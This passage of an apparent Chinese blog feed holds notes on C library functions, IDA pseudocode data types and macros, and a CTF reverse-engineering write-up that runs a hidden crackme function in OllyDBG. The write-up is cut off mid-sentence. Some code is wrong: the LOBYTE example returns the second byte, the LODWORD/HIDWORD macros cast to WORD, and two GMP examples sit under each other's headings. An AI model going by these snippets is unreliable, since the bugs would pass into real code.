class="headerlink" title="memset"></a>memset</h1><blockquote><p><strong><code>void *memset(void *str, int ch, size_t n)</code>——用于非常量的内存空间初始化</strong></p></blockquote><ul><li><p>复制字符 <code>ch</code>（一个无符号字符）到参数 <code>str</code> 所指向的字符串的前 n 个字符</p></li><li><p>将 <code>str</code> 中当前位置后面的 n个字节 用 <code>ch</code> 替换并返回 <code>str</code>，<code>ch</code> 只有最低的字节起作用</p></li><li><p>作用是将某一块内存中的内容全部设置为指定的值， 这个函数通常为新申请的内存做初始化工作</p></li></ul><hr><h1 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h1><blockquote><p><strong><code>int atoi(const char *str)</code>——把参数 str 所指向的字符串转换为一个整数（类型为 int 型）</strong></p></blockquote><ul><li><p>该函数返回转换后的长整数，如果没有执行有效的转换，则返回零</p></li><li><p>示例：<br><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_IDA%E2%80%94%E2%80%94C%E4%BC%AA%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%861.png" alt="CTF - Reverse_IDA——C伪代码知识1.png"></p></li><li><p>结果：<br><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_IDA%E2%80%94%E2%80%94C%E4%BC%AA%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%862.png" alt="CTF - Reverse_IDA——C伪代码知识2.png"></p></li></ul><hr><h1 id="atol"><a href="#atol" class="headerlink" title="atol"></a>atol</h1><blockquote><p><strong><code>long int atol(const char *str)</code>——把参数 str 所指向的字符串转换为一个长整数（类型为 long int 型）</strong></p></blockquote><ul><li>该函数返回转换后的长整数，如果没有执行有效的转换，则返回零</li></ul><hr><h1 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h1><blockquote><p><strong><code>int setvbuf(FILE *stream, char *buffer, int mode, size_t size)</code>——定义流 stream 应如何缓冲，把缓冲区与流相关</strong></p></blockquote><ul><li>如果成功，则该函数返回 0，否则返回非零值</li></ul><hr><h1 id="errno-location"><a href="#errno-location" class="headerlink" title="errno_location"></a>errno_location</h1><blockquote><p><strong><code>int *__errno_location(void)</code>——返回当前线程的变量地址</strong></p></blockquote><ul><li><p>这个函数的返回值是一个函数指针，这个指针指向线程自己的 errno 的位置，通过对这个指针解引用，就可以访问线程唯一的 errno</p></li><li><p><strong>errno 是 error number 的缩写，意味系统调用错误码</strong><br>  如果系统调用返回成功，errno 有可能但不一定会置 0；而系统调用出错时，errno 必定会被设为对应的错误编号</p></li></ul><hr><h1 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h1><blockquote><p><strong><code>void *malloc(size_t size)</code>——分配所需的内存空间，并返回一个指向它的指针</strong></p></blockquote><ul><li><p><code>size</code> 为内存块的大小，以字节为单位</p></li><li><p>该函数返回一个指针 ，指向已分配大小的内存。如果请求失败，则返回 NULL</p></li></ul><hr><h1 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h1><blockquote><p><strong><code>void *calloc(size_t nitems, size_t size)</code>——分配所需的内存空间，并返回一个指向它的指针</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>nitems</td><td>要被分配的元素个数</td></tr><tr><td>size</td><td>元素的大小</td></tr></tbody></table><ul><li><p>该函数返回一个指针，指向已分配的内存。如果请求失败，则返回 NULL</p></li><li><p><code>malloc</code> 和 <code>calloc</code> 之间的不同点：<br>  <mark>malloc 不会设置内存为零；而 calloc 会设置分配的内存为零</mark></p></li></ul><hr><h1 id="gmpz-init-set-str（等同于-mpz-init-set-str）"><a href="#gmpz-init-set-str（等同于-mpz-init-set-str）" class="headerlink" title="gmpz_init_set_str（等同于 mpz_init_set_str）"></a>gmpz_init_set_str（等同于 mpz_init_set_str）</h1><blockquote><p><strong><code>int mpz_init_set_str (mpz_t rop, char *str, int base)</code>——将 str 字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存</strong></p><p><strong>GMP 又叫 GNU 多精度算术库，是一个提供了很多操作高精度的大整数、浮点数运算的算术库，几乎没有什么精度方面的限制，功能丰富</strong></p></blockquote><ul><li>这三个参数分别是：</li></ul><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>rop</td><td>多精度整数变量</td></tr><tr><td>str</td><td>字符串</td></tr><tr><td>base</td><td>进制</td></tr></tbody></table><ul><li>示例：<br><code>mpz_powm(op1,op2,op3,op4)； // 求幂模函数</code>，即：<code>op1 = op2 ^ op3 mod op4</code></li></ul><hr><h1 id="gmpz-powm（等同于-mpz-powm）"><a href="#gmpz-powm（等同于-mpz-powm）" class="headerlink" title="gmpz_powm（等同于 mpz_powm）"></a>gmpz_powm（等同于 mpz_powm）</h1><blockquote><p><strong><code>void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)</code>——计算 base 的 exp 次方，并对 mod 取模，最后将结果写入 rop 中</strong></p></blockquote><ul><li><p>运算的过程和 RSA 的加密过程一样</p></li><li><p>示例：<br><code>mpz_init_set_str(b, “200000”, 10)； // 即：b=200000，十进制</code></p></li></ul><hr><h1 id="gmpz-cmp（等同于-mpz-cmp）"><a href="#gmpz-cmp（等同于-mpz-cmp）" class="headerlink" title="gmpz_cmp（等同于 mpz_cmp）"></a>gmpz_cmp（等同于 mpz_cmp）</h1><blockquote><p><strong><code>mpz_cmp(mpz_t num1, mpz_t num_2)</code>——比较两个数</strong></p></blockquote><ul><li>示例：<br><code>mpz_cmp(b, c)； // 若 b 大于 c，返回1；若 b 等于 c，返回0；若 b 小于 c，返回-1</code></li></ul><hr><h1 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h1><blockquote><p><strong><code>char *strcat(char *dest, const char *src)</code>——把 src 所指向的字符串追加到 dest 所指向的字符串的结尾</strong></p></blockquote><table><thead><tr><th>参数</th><th>意义</th></tr></thead><tbody><tr><td>dest</td><td>指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串</td></tr><tr><td>src</td><td>指向要追加的字符串，该字符串不会覆盖目标字符串</td></tr></tbody></table><ul><li>该函数返回一个指向最终的目标字符串 <code>dest</code> 的指针</li></ul><hr><h1 id="time"><a href="#time" class="headerlink" title="time"></a>time</h1><blockquote><p><strong><code>time_t time(time_t *timer)</code>——得到当前日历时间或者设置日历时间</strong></p></blockquote><ul><li><p>参数说明:<br>  <code>timer = NULL</code> 时得到当前日历时间（从1970-01-01 00:00:00到现在的秒数）<br>  <code>timer = 时间数值</code> 时，用于设置日历时间，<code>time_t</code> 是一个 unsigned long 类型<br>  如果 <code>timer</code> 不为空，则返回值也存储在变量 <code>timer</code> 中</p></li><li><p>函数返回：当前日历时间</p></li></ul><hr><h1 id="localtime"><a href="#localtime" class="headerlink" title="localtime"></a>localtime</h1><blockquote><p><strong><code>struct tm *localtime(const time_t *timer)</code>——使用 timer 的值来填充 tm 结构。timer 的值被分解为 tm 结构，并用本地时区表示</strong></p></blockquote><ul><li><p><code>timer</code> 是指向表示日历时间的 <code>time_t</code> 值的指针</p></li><li><p>该函数返回指向 <code>tm</code> 结构的指针，该结构带有被填充的时间信息</p></li><li><p><code>tm</code> 结构的细节：</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">tm</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> tm_sec<span class="token punctuation">;</span>         <span class="token comment">/* 秒，范围从 0 到 59 */</span>   <span class="token keyword">int</span> tm_min<span class="token punctuation">;</span>         <span class="token comment">/* 分，范围从 0 到 59 */</span>   <span class="token keyword">int</span> tm_hour<span class="token punctuation">;</span>        <span class="token comment">/* 小时，范围从 0 到 23 */</span>   <span class="token keyword">int</span> tm_mday<span class="token punctuation">;</span>        <span class="token comment">/* 一月中的第几天，范围从 1 到 31 */</span>   <span class="token keyword">int</span> tm_mon<span class="token punctuation">;</span>         <span class="token comment">/* 月份，范围从 0 到 11 */</span>   <span class="token keyword">int</span> tm_year<span class="token punctuation">;</span>        <span class="token comment">/* 自 1900 起的年数 */</span>   <span class="token keyword">int</span> tm_wday<span class="token punctuation">;</span>        <span class="token comment">/* 一周中的第几天，范围从 0 到 6 */</span>   <span class="token keyword">int</span> tm_yday<span class="token punctuation">;</span>        <span class="token comment">/* 一年中的第几天，范围从 0 到 365 */</span>   <span class="token keyword">int</span> tm_isdst<span class="token punctuation">;</span>       <span class="token comment">/* 夏令时 */</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h1><blockquote><p><strong><code>int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg)</code>——用来创建线程，在线程创建以后，就开始运行相关的线程函数</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>pthread_t *thread</code></td><td align="left">新创建的线程 ID 指向的内存单元。pthread_t 是一种用于表示线程的数据类型，每一个 pthread_t 类型的变量都可以表示一个线程</td></tr><tr><td align="left"><code>const pthread_attr_t *attr</code></td><td align="left">用于手动设置新建线程的属性，例如线程的调用策略、线程所能使用的栈内存的大小等。大部分场景中，我们都不需要手动修改线程的属性，将 attr 参数赋值为 NULL，pthread_create() 函数会采用系统默认的属性值创建线程</td></tr><tr><td align="left"><code>void *(*start_routine) (void *)</code></td><td align="left">新创建的线程从start_rtn函数的地址开始运行。形参和返回值的类型都必须为 void* 类型</td></tr><tr><td align="left"><code>void *arg</code></td><td align="left">指定传递给 start_routine 函数的实参，当不需要传递任何数据时，将 arg 赋值为 NULL 即可</td></tr></tbody></table><ul><li>如果成功创建线程，pthread_create() 函数返回数字 0，反之返回非零值</li><li>各个非零值都对应着不同的宏，指明创建失败的原因，常见的宏有以下几种：<ol><li><strong>EAGAIN</strong>：系统资源不足，无法提供创建线程所需的资源</li><li><strong>EINVAL</strong>：传递给 pthread_create() 函数的 attr 参数无效</li><li><strong>EPERM</strong>：传递给 pthread_create() 函数的 attr 参数中，某些属性的设置为非法操作，程序没有相关的设置权限</li></ol></li></ul><hr><h1 id="pthread-join"><a href="#pthread-join" class="headerlink" title="pthread_join"></a>pthread_join</h1><blockquote><p><strong><code>int pthread_join(pthread_t thread, void * * retval)</code>——获取某个线程执行结束时返回的数据</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">thread</td><td align="left">指定接收哪个线程的返回值</td></tr><tr><td align="left">retval</td><td align="left">接收到的返回值。如果 thread 线程没有返回值，或者不需要接收 thread 线程的返回值，可以将 retval 参数置为 NULL</td></tr></tbody></table><ul><li><code>pthread_join()</code> 函数会一直阻塞调用它的线程，直至目标线程执行结束（接收到目标线程的返回值），阻塞状态才会解除</li><li>如果 <code>pthread_join()</code> 函数成功等到了目标线程执行结束（成功获取到目标线程的返回值），返回值为数字 0；反之如果执行失败，函数会根据失败原因返回相应的非零值，每个非零值都对应着不同的宏，例如：  <ol><li><strong>EDEADLK</strong>：检测到线程发生了死锁</li><li><strong>EINVAL</strong>：分为两种情况，要么目标线程本身不允许其它线程获取它的返回值，要么事先就已经有线程调用 pthread_join() 函数获取到了目标线程的返回值</li><li><strong>ESRCH</strong>：找不到指定的 thread 线程</li></ol></li></ul><hr><h1 id="fseek"><a href="#fseek" class="headerlink" title="fseek"></a>fseek</h1><blockquote><p><strong><code>int fseek(FILE *stream, long offset, int origin)</code>——用于移动文件指针到指定的位置，从而在文件中进行随机访问或定位</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">stream</td><td align="left">文件指针，指向要操作的文件</td></tr><tr><td align="left">offset</td><td align="left">文件指针偏移量，即要移动的字节数</td></tr><tr><td align="left">origin</td><td align="left"><div>指定参考位置，可以是以下常量之一：</div><div>SEEK_SET：从文件开头开始计算偏移</div><div>SEEK_CUR：从当前位置开始计算偏移</div><div>SEEK_END：从文件末尾开始计算偏移</div></td></tr></tbody></table><ul><li><p><code>fseek()</code> 函数可用于二进制文件和文本文件。对于文本文件，由于可能存在换行符和不可见字符，使用 <code>fseek()</code> 函数移动文件指针时需要小心，以免导致错误的结果</p></li><li><p>返回值：<br>  成功：<code>fseek</code> 函数将返回零<br>  失败：返回非零值</p></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> IDA </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中的一些数据类型</title>
      <link href="/posts/874a8fd2.html"/>
      <url>/posts/874a8fd2.html</url>
      
        <content type="html"><![CDATA[<h1 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h1><h2 id="数据的后缀"><a href="#数据的后缀" class="headerlink" title="数据的后缀"></a>数据的后缀</h2><table><thead><tr><th>符号后缀</th><th>含义</th></tr></thead><tbody><tr><td><strong>u</strong></td><td>unsigned int</td></tr><tr><td><strong>L</strong></td><td>long</td></tr><tr><td><strong>F</strong></td><td>float</td></tr><tr><td><strong>LL</strong></td><td>long long</td></tr></tbody></table><ul><li><p><strong>0x18</strong>，十六进制数 18，十进制数 24</p></li><li><p><strong>0x47ui64</strong>，十六进制数 47，十进制数 71，类型为 <code>unsigned __int64</code></p></li><li><p><strong>\x1A</strong>，十六进制数 1A，十进制数 26，其中 <code>\x</code> 为转义字符</p><ul><li><code>\x</code> 表示后面的字符是 十六进制数</li><li><code>\0</code> 表示后面的字符是 八进制数</li></ul></li><li><p>在标准的 C++ 代码中没有类似于 <code>ui64</code> 的后缀，是编译器扩展，改为 <code>u</code> 即可</p></li></ul><hr><h2 id="数据的前缀"><a href="#数据的前缀" class="headerlink" title="数据的前缀"></a>数据的前缀</h2><h3 id="不同位数的-int-类型"><a href="#不同位数的-int-类型" class="headerlink" title="不同位数的 int 类型"></a>不同位数的 int 类型</h3><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><strong>int8</strong></td><td align="left">8 位，等于 byte，占 1 个字节</td></tr><tr><td align="left"><strong>int16</strong></td><td align="left">16 位，等于 short，占 2 个字节</td></tr><tr><td align="left"><strong>int32</strong></td><td align="left">32 位，等于 int，占 4 个字节</td></tr><tr><td align="left"><strong>int64</strong></td><td align="left">64 位，等于 long，占 8 个字节</td></tr></tbody></table><ul><li><p><em>伪代码中的 <code>_DWORD</code> 类型，改写到在 C++ 中需引入头文件 <code>#include &lt;windows.h&gt;</code>，去掉 <code>&#39;_&#39;</code>，改写为 <code>DWORD</code></em></p></li><li><p>IDA 的伪代码中，有些参数的数据类型并不准确，比如 <code>char 类型</code>、<code>string 类型</code>、<code>_int64 类型</code> 等，需自己判断</p></li></ul><p>在编写 C、C++ 脚本时，对应的数据类型也可以写为：</p><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><strong>int8_t</strong></td><td align="left">8 位，占 1 个字节</td></tr><tr><td align="left"><strong>int16_t</strong></td><td align="left">16 位，占 2 个字节</td></tr><tr><td align="left"><strong>int32_t</strong></td><td align="left">32 位，占 4 个字节</td></tr><tr><td align="left"><strong>int64_t</strong></td><td align="left">64 位，占 8 个字节</td></tr></tbody></table><blockquote><p>例如 <code>int32_t</code> 是一种有符号的 32 位整数类型，通常用于<em>确保在不同平台上有相同大小的整数表示</em><br>这是 C&#x2F;C++ 标准库中的一个固定大小整数类型，<em>可以确保在各种系统上都是 32 位</em></p></blockquote><p>或者使用无符号数类型：</p><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><strong>uint8_t</strong></td><td align="left">8 位无符号，占 1 个字节</td></tr><tr><td align="left"><strong>uint16_t</strong></td><td align="left">16 位无符号，占 2 个字节</td></tr><tr><td align="left"><strong>uint32_t</strong></td><td align="left">32 位无符号，占 4 个字节</td></tr><tr><td align="left"><strong>uint64_t</strong></td><td align="left">64 位无符号，占 8 个字节</td></tr></tbody></table><ul><li>C 语言可引入头文件 <code>#include &lt;stdint.h&gt;</code>，C++ 可引入 <code>#include &lt;iostream&gt;</code> 或直接使用 <code>std::uint64_t</code></li></ul><hr><h3 id="BYTE"><a href="#BYTE" class="headerlink" title="(_BYTE *)"></a>(_BYTE *)</h3><ul><li>将值或寄存器转换为字节指针，类似于将值分配给 C 变量 <code>byte *</code></li></ul><hr><h3 id="BYTE-1"><a href="#BYTE-1" class="headerlink" title="*(_BYTE *)"></a>*(_BYTE *)</h3><ul><li>从地址中提供的指针中取出一个字节</li></ul><p>如果地址是 12345678，并且该地址存放的是字符串 “hello”</p><p><code>x = *(_BYTE *) (12345678 + counter)</code></p><p>如果 counter 是 0，那么 x 将是 ‘h’<br>如果 counter 是 1，那么 x 将是 ‘e’</p><hr><h2 id="IDA-中的数据宏定义"><a href="#IDA-中的数据宏定义" class="headerlink" title="IDA 中的数据宏定义"></a>IDA 中的数据宏定义</h2><table><thead><tr><th align="left">函数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><em><strong>LOWORD()</strong></em></td><td align="left">得到一个 32bit 数的 低 两字节的16bit</td></tr><tr><td align="left"><em><strong>HIWORD()</strong></em></td><td align="left">得到一个 32bit 数的 高 两字节的16bit</td></tr><tr><td align="left"><em><strong>LOBYTE()</strong></em></td><td align="left">得到一个 16bit 数的 最低（最右边）那个字节 8bit</td></tr><tr><td align="left"><em><strong>HIBYTE()</strong></em></td><td align="left">得到一个 16bit 数的 最高（最左边）那个字节 8bit</td></tr></tbody></table><hr><h3 id="宏定义的函数表示"><a href="#宏定义的函数表示" class="headerlink" title="宏定义的函数表示"></a>宏定义的函数表示</h3><ul><li>以 32 位程序，四字节数据 <code>0xc3d57636</code> 为例：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 0xc3</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的最高一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token comment">// *((char *) &amp;w + 3);</span><span class="token punctuation">&#125;</span>  <span class="token comment">// 0xd5</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BYTE2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 取四字节数据的次高一字节  </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token comment">// *((char *) &amp;w + 2);</span><span class="token punctuation">&#125;</span>  <span class="token comment">// 0x76</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的次低一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token comment">// *((char *) &amp;w + 1);</span><span class="token punctuation">&#125;</span><span class="token comment">// 0x36</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span>  <span class="token comment">// 取四字节数据的最低一字节  </span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> w <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>  <span class="token comment">// *((char *) &amp;w);</span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BJDCTF】Easy</title>
      <link href="/posts/d7d68609.html"/>
      <url>/posts/d7d68609.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>OllyDBG 动态调试</p></li><li><p><mark>当 main 中没有与 flag 有关的信息时，寻找其他可能与 flag 相关的函数</mark></p></li><li><p><mark>C 语言获取数据 高位 和 低位 的方法</mark>：<code>#include&lt;windows.h&gt;</code></p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">LOWORD      取 <span class="token number">32</span> bits 低 <span class="token number">16</span> bitsHIWORD      取 <span class="token number">32</span> bits 高 <span class="token number">16</span> bitsLOBYTE      取 <span class="token number">16</span> bits 低 <span class="token number">8</span> bitsHIBYTE      取 <span class="token number">16</span> bits 高 <span class="token number">8</span> bits<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p><a href="https://www.ctfer.vip/problem/702">【BJDCTF】Easy</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>在 main 函数中未发现与 flag 有关的信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy1.png" alt="BJDCTF-Easy1.png"></p><p>设置时间，并将时间分解为 tm 结构，赋值给 v5，但是 v5 也没有使用</p><p>查看字符串也没有与 flag 有关的信息</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy2.png" alt="BJDCTF-Easy2.png"></p><p><em><strong>依次查看其他的函数，发现大部分函数都是调用系统函数或是没有什么实际用处的函数</strong></em><br><em><strong>只有 <code>__ques</code> 函数的内容看起来不是没用的函数，比较正常</strong></em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy3.png" alt="BJDCTF-Easy3.png"></p><p>同时，在 <code>__ques</code> 函数中，包含打印操作：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// '*'</span>          <span class="token operator">++</span>v7<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">// ' '</span>        <span class="token operator">++</span>v7<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v7 <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    result <span class="token operator">=</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// '\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序会输出 <code>&#39;*&#39;</code> 、<code>&#39; &#39;</code> 、<code>&#39;\n&#39;</code> 三种字符，而且函数名 <code>__ques</code> 让人联想到 question，这个函数很可能与 flag 有关</p><p>完整的 <code>__ques</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy4.png" alt="BJDCTF-Easy4.png"></p><p>将这个函数拷贝出来，在 CLion 中跑一遍</p><p>但是 <code>LODWORD</code>、<code>HIDWORD</code> 两个函数总是报错，导入库 <code>#incluede&lt;windows.h&gt;</code><br>或者自己定义：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">LODWORD</span><span class="token expression"><span class="token punctuation">(</span>l<span class="token punctuation">)</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span>WORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HIDWORD</span><span class="token expression"><span class="token punctuation">(</span>l<span class="token punctuation">)</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span>WORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>都会报错，实在没办法了</p><p>但是由于 <code>LODWORD(l)</code> 的作用就是取数据 <code>l</code> 的 低 32位，<code>HIDWORD(l)</code> 就是取数据 <code>l</code> 的 高 32位<br>尝试手动实现该功能，将：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">LODWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>替换为：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">v6 <span class="token operator">=</span> v0 <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> v4<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>虽然能跑，但是有几个位置输出不全：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy5.png" alt="BJDCTF-Easy5.png"></p><p>大致能看出该程序打印的是一些字符，大概率就是 flag 了</p><p><em><strong>既然 flag 是由该程序输出，而 main 中却并没有调用该函数，因此才导致 main 函数的内容看起来和 flag 无关，因此只需要手动让该程序执行 <code>__ques</code> 函数就可以了</strong></em></p><p><mark>这里使用 OllyDBG 进行动态调试</mark><br>首先在 IDA 中注意到函数 <code>__ques</code> 的起始地址：<code>0x00401520</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy6.png" alt="BJDCTF-Easy6.png"></p><p>在 OllyDBG 中 <code>ctrl + g</code> 定位到该地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy7.png" alt="BJDCTF-Easy7.png"></p><p>在 <code>__ques</code> 函数入口处 F2 下断点<br>并<mark>将此位置设置为新 EIP，即让程序直接从这里开始执行</mark></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BJDCTF-Easy8.png" alt="BJDCTF-Easy8.png"></p><p>同样，在 IDA 中找到 